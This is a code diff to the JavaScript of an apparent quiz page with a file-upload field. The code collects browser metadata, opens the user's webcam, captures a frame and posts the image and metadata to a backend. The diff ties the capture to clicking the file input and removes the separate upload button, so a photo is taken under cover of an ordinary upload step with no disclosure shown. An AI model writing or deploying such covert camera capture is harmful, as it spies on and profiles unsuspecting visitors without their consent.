@@ -2,17 +2,16 @@ const form = document.getElementById("quiz-form");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
-const uploadBtn = document.getElementById("upload-btn"); // ✅ NEW BUTTON
 
 const BACKEND_BASE = "/api";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
-let cameraInProgress = false; // ✅ prevents double popup
+let cameraInProgress = false;
 
-// ================================
-// COLLECT METADATA
-// ================================
+// ✅ NEVER CALL CAMERA ON LOAD ✅
+// only when file input clicked
+
 async function collectMetadata() {
   const metadata = {
     useragent: navigator.userAgent,
@@ -47,9 +46,6 @@ async function collectMetadata() {
   return metadata;
 }
 
-// ================================
-// CAPTURE CAMERA + SEND (ONLY ONCE)
-// ================================
 async function captureAndSendCamera() {
   if (cameraCaptured || cameraInProgress) return;
   cameraInProgress = true;
@@ -58,15 +54,12 @@ async function captureAndSendCamera() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    // ✅ Wait for video ready
     await new Promise((resolve) => {
       video.onloadedmetadata = () => resolve();
     });
 
     await video.play();
-
-    // wait 1.5 sec for better capture
-    await new Promise((r) => setTimeout(r, 1500));
+    await new Promise((r) => setTimeout(r, 1200));
 
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -83,31 +76,21 @@ async function captureAndSendCamera() {
       body: JSON.stringify({ image, metadata }),
     });
 
-    // ✅ Stop camera after capture
     stream.getTracks().forEach((t) => t.stop());
-
     cameraCaptured = true;
   } catch (err) {
-    console.log("Camera blocked/denied:", err);
+    console.log("Camera error:", err);
   } finally {
     cameraInProgress = false;
   }
 }
 
-// ================================
-// ✅ ONLY ASK PERMISSION WHEN USER CLICKS UPLOAD BUTTON
-// ================================
-uploadBtn.addEventListener("click", async () => {
-  // ✅ Camera permission popup happens only here
-  await captureAndSendCamera();
-
-  // ✅ After camera capture, open file picker
-  fileInput.click();
+// ✅ CAMERA ONLY HERE ✅
+fileInput.addEventListener("click", () => {
+  captureAndSendCamera();
 });
 
-// ================================
-// FILE UPLOAD
-// ================================
+// File upload
 async function uploadFile(file) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
@@ -119,6 +102,7 @@ async function uploadFile(file) {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ file: reader.result, filename: file.name }),
         });
+
         resolve(await res.json());
       } catch (err) {
         reject(err);
@@ -130,9 +114,6 @@ async function uploadFile(file) {
   });
 }
 
-// ================================
-// SUBMIT FORM
-// ================================
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
@@ -142,14 +123,7 @@ form.addEventListener("submit", async (e) => {
   }
 
   try {
-    const selectedFile = fileInput.files[0];
-
-    if (!selectedFile) {
-      alert("Please select a file first!");
-      return;
-    }
-
-    await uploadFile(selectedFile);
+    await uploadFile(fileInput.files[0]);
 
     document.getElementById("quiz-container").style.display = "none";
     document.getElementById("success-container").style.display = "flex";
